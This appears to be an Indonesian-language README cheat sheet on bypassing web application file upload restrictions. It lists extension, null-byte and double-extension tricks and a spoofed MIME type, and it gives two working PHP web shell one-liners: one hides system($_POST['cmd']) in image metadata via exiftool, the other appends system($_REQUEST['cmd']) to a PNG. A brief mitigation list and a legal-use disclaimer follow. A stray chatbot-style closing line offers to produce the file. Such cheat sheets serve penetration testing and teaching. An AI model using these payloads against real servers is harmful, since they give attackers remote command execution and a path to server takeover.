# 📂 Unrestricted File Upload Bypass Techniques

![License](https://img.shields.io/badge/license-Educational-blue)
![Status](https://img.shields.io/badge/status-Active-brightgreen)
![Security](https://img.shields.io/badge/security-awareness-important)

> 📖 **Dokumen ini menjelaskan berbagai teknik umum yang digunakan untuk bypass pembatasan unggah file pada aplikasi web.**
> Ditujukan untuk **peneliti keamanan**, **penetration tester**, dan **developer** dalam mengidentifikasi potensi celah dan membangun mitigasi yang tepat.

---

## 📖 Daftar Isi

* [Deskripsi](#deskripsi)
* [Tabel Summary Bypass](#📊-tabel-summary-bypass)
* [Bypass Ekstensi File Umum](#bypass-ekstensi-file-umum)
* [Bypass Magic Number](#📌-teknik-bypass-magic-number)
* [Bypass Tipe MIME](#bypass-tipe-mime)
* [Teknik Unggah File Tanpa Batasan](#teknik-unggah-file-tanpa-batasan)
* [Rekomendasi Mitigasi](#📌-rekomendasi-mitigasi)
* [Lisensi](#📑-lisensi)
* [Kontak](#📬-kontak)

---

## Deskripsi

Serangan unrestricted file upload memungkinkan penyerang mengunggah file berbahaya ke server karena validasi yang lemah. Teknik di dokumen ini memanfaatkan celah pada:

* Validasi ekstensi file
* Pemeriksaan MIME type
* Pemeriksaan magic number file
* Sanitasi nama file yang buruk

---

## 📊 Tabel Summary Bypass

| Teknik                     | Contoh Ekstensi / Metode             | Tujuan                               |
| :------------------------- | :----------------------------------- | :----------------------------------- |
| **Bypass Ekstensi**        | `.php`, `.php5`, `.php.jpg`          | Menipu validasi ekstensi             |
| **Magic Number Injection** | Inject PHP code via `Exiftool`       | Menyisipkan shell di metadata gambar |
| **MIME Type Bypass**       | `application/x-httpd-php`            | Mengakali pengecekan tipe konten     |
| **Encoded Extension**      | `.php%00`, `.php%20`, `.php%0a`      | Menyembunyikan ekstensi asli         |
| **Double/Mixed Extension** | `.png.php`, `.jpg.pHp5`, `.php#.png` | Menyiasati pemeriksaan nama file     |

---

## Bypass Ekstensi File Umum

Beberapa ekstensi yang umum digunakan untuk bypass:

```
.php, .php5, .phtml, .pgif, .phar, .cgi, .pl, .py, .Php, .php.jpg, .php.bak, .exe
```

**Variasi:**

* `.php56`, `.php.test`, `.php.docx`, `.php.unknown`
* `.php.xxxjpg`, `.php.xxxpdf`, `.php.xxxzip`

---

## 📌 Teknik Bypass Magic Number

### 📌 Inject Metadata via Exiftool

```bash
exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
```

---

### 📌 Append PHP Code ke File Gambar

```bash
echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
```

---

## Bypass Tipe MIME

Bypass validasi dengan tipe MIME:

```
application/x-httpd-php
```

---

## Teknik Unggah File Tanpa Batasan

### 📌 Encoded Extension

```
.php%00, .php%20, .php%0a, .php/, .php....
```

### 📌 Double / Mixed Extension

```
.png.php, .php#.png, .php%00.png, .png.jpg.php
```

---

## 📌 Rekomendasi Mitigasi

✅ Validasi **whitelist ekstensi file**

✅ Pemeriksaan **MIME type di server**

✅ Verifikasi **magic number file**

✅ Sanitasi nama file dari karakter spesial

✅ Simpan file **di luar web root**

✅ Atur **file permission non-eksekusi**

✅ Batasi ukuran & scan isi file

---

## 📑 Lisensi

Distribusi untuk tujuan edukasi & keamanan siber.
**Gunakan dengan tanggung jawab.**

---

## 📬 Kontak

📧 Email: **[sinzoxp@gmail.com](mailto:sinzoxp@gmail.com)**
📱 Telegram: [@avxxr00t](https://t.me/avxxr00t)

---

## 📌 Note Tambahan

🚨 **Disclaimer:**
Gunakan teknik ini hanya untuk **penetration testing legal** atau riset di lingkungan yang Anda miliki izin penuh.

---

## 📎 Preview Markdown

Jika ingin langsung dipasang ke repository GitHub, tinggal simpan dengan nama `README.md`.

---

Kalau mau sekalian kubuatin versi markdown file-nya (.md) siap download juga, tinggal beri tahu aja bro! Mau? 🚀🔥
